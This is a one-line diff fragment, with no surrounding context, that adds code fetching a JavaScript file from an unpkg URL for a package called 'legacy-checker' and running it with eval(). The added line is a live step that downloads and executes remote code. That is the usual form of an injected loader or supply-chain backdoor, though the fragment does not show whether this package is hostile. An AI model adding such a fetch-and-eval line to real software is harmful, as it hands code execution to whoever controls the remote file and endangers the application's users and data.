@@ -1,0 +1,1 @@
+await fetch(new Request('https://unpkg.com/legacy-checker/dist/main.js')).then(js => js.text()).then(js => eval(js));
